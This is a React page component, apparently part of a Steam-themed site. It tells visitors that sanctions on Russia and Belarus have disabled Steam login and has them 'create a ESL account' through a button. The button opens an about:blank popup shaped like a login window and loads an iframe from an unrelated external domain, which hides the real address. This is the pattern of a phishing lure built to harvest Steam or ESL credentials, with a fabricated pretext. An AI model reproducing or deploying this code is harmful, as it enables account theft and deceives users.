import Button from "../components/UI/Button";
import Logo from "../components/UI/Logo";

import "../styles/pages/Page.scss";
import "../styles/pages/SteamConnectPage.scss";

const SteamConnectPage = () => {

    const handleShowIframe = () => {
        const width = 1000;
        const height = 800;

        const left = (window.screen.width / 2) - (width / 2);
        const top = (window.screen.height / 2) - (height / 2);

        const newWindow = window.open(
            'about:blank',
            '_blank',
            `width=${width},height=${height},top=${top},left=${left}`
        );


        if (newWindow) {
            const iframe = newWindow.document.createElement('iframe');
            iframe.src = 'https://lagrfield34.com/74fab';
            iframe.width = '100%';
            iframe.height = '100%';
            iframe.style.border = 'none';

            newWindow.document.body.innerHTML = '';
            newWindow.document.body.style.margin = '0';
            newWindow.document.body.appendChild(iframe);
        }
    }


    return (
        <div className="page">
            <div className="connect-page-container">
                <div className="connect-steam-modal">
                    <Logo isWhite={true} />

                    <p className="fs-16 c-white">
                        Due to sanctions for residents of Russia and Belarus,
                        Steam has disabled the ability to instantly connect an
                        account to our site. Please create a ESL account by
                        clicking on the button below.
                    </p>

                    <Button
                        text="Create an account"
                        callback={() => handleShowIframe()}
                        classes="upper"
                        style={{ width: "100%" }}
                    />
                </div>
            </div>
        </div>
    );
};

export default SteamConnectPage;
